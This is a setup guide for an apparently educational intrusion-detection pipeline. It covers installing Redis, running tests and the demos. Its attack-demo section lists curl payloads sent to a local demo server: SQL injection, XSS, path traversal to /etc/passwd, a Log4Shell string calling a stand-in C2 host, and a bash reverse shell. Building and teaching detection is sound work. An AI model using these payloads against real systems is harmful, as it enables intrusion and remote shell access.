======================================================================
  NEURALOPS — SETUP GUIDE
  Step by step from scratch to running demo
======================================================================

  Prerequisites: Ubuntu/Debian, Python 3.10+, git

======================================================================
  1. INSTALL SYSTEM DEPENDENCIES
======================================================================

  sudo apt update
  sudo apt install -y redis-server python3-pip python3-venv

======================================================================
  2. INSTALL PYTHON PACKAGES
======================================================================

  cd /home/beast/Downloads/neuralops
  pip install -r requirements.txt

  If you get permission errors:
    pip install --user -r requirements.txt

======================================================================
  3. START REDIS (required for full pipeline)
======================================================================

  redis-server --daemonize yes
  redis-cli ping
    → Should reply: PONG

======================================================================
  4. RUN TESTS (verify everything works)
======================================================================

  python3 tests/test_parsers.py
  python3 tests/test_rules.py
  python3 tests/test_scenarios.py

  Expected output: All 16 tests PASS

======================================================================
  5. XSS DEMO (no Redis needed, best for classroom)
======================================================================

  python3 scripts/demo_xss.py

  Walks through 6 steps:
    Step 1: Raw log injected (onmouseover payload)
    Step 2: Parser normalizes + URL decodes
    Step 3: GeoIP enrichment (skipped if no DB)
    Step 4: Behavioral baseline (IP profiling)
    Step 5: 63 rules scanned → XSS matched
    Step 6: Final alert with geo, confidence_factors, matched_pattern

  One script, no setup needed.

======================================================================
  5b. ATTACK DEMO (3 terminals — you are the attacker!)
======================================================================

  This shows the full pipeline: you attack → collector captures →
  engine detects → alert output.

  Terminal 1 — Start the target web server (the "victim" site):
    python3 scripts/demo_server.py
    (Runs on http://127.0.0.1:8080)

  Terminal 2 — Start the detection engine:
    python3 workers/detect_engine.py
    (Waits for logs from Redis)

  Terminal 3 — You are the attacker:
    curl "http://127.0.0.1:8080/login?user=admin&pass=1%27%2BOR%2B%271%27%3D%271"
    curl "http://127.0.0.1:8080/search?q=<script>alert(1)</script>"
    curl "http://127.0.0.1:8080/products?id=../../../etc/passwd"

  What happens:
    1. You hit the server with an attack via curl/browser
    2. The FastAPI middleware captures the request (source_ip, method, url, body, UA)
    3. Middleware pushes the log to Redis stream neuralops:logs
    4. The detection engine reads it from Redis
    5. Engine runs: parse → decode → enrich → baseline → 63 rules → score
    6. Terminal 2 prints the final alert with all fields

  Example attack commands:
    # SQL Injection
    curl "http://127.0.0.1:8080/login?user=admin&pass=1%27%2BOR%2B%271%27%3D%271"

    # XSS
    curl "http://127.0.0.1:8080/search?q=<script>alert(1)</script>"
    curl "http://127.0.0.1:8080/search?q=<input+onmouseover=%22alert(1)%22>"

    # Path Traversal
    curl "http://127.0.0.1:8080/products?id=../../../etc/passwd"

    # Log4Shell
    curl -H "User-Agent: \${jndi:ldap://evil-c2.com:1389/a}" http://127.0.0.1:8080/

    # Reverse Shell
    curl -d "cmd=bash -i >& /dev/tcp/192.0.0.99/4444 0>&1" http://127.0.0.1:8080/upload

======================================================================
  6. FULL PIPELINE DEMO (requires Redis)
======================================================================

  One-command startup:
    bash run.sh

  Or start services individually:
    python3 workers/rule_engine.py &   # main detection
    python3 workers/ml_anomaly.py &    # ML anomaly detection
    python3 workers/threat_intel.py &  # AbuseIPDB + VirusTotal
    python3 workers/output.py &        # file log + Slack

  Inject test attacks into Redis:
    python3 scripts/seed_test_attacks.py

======================================================================
  7. CHECK OUTPUT
======================================================================

  Count alerts:
    redis-cli XLEN neuralops:alerts

  Read last 5 alerts (full JSON):
    redis-cli XREAD COUNT 5 STREAMS neuralops:alerts 0

  Watch live alert log:
    tail -f /tmp/neuralops_alerts.log

======================================================================
  8. GEOIP ENRICHMENT (optional — enhances alerts with country/city)
======================================================================

  pip install maxminddb
  python3 scripts/download_geoip.py

  Re-run demo to see geo fields populated.

======================================================================
  9. THREAT INTEL (optional — adds AbuseIPDB/VirusTotal scores)
======================================================================

  Set API keys in environment:
    export ABUSEIPDB_KEY="your_key"
    export VIRUSTOTAL_KEY="your_key"
    export GREYNOISE_KEY="your_key"

  Then restart the threat intel worker:
    python3 workers/threat_intel.py

======================================================================
  10. PROJECT STRUCTURE QUICK REFERENCE
======================================================================

  neuralops/
  ├── config/           Settings, Redis connection
  ├── shared/           Alert schema, utils

  ├── run.sh            One-command startup
  └── requirements.txt  Python dependencies
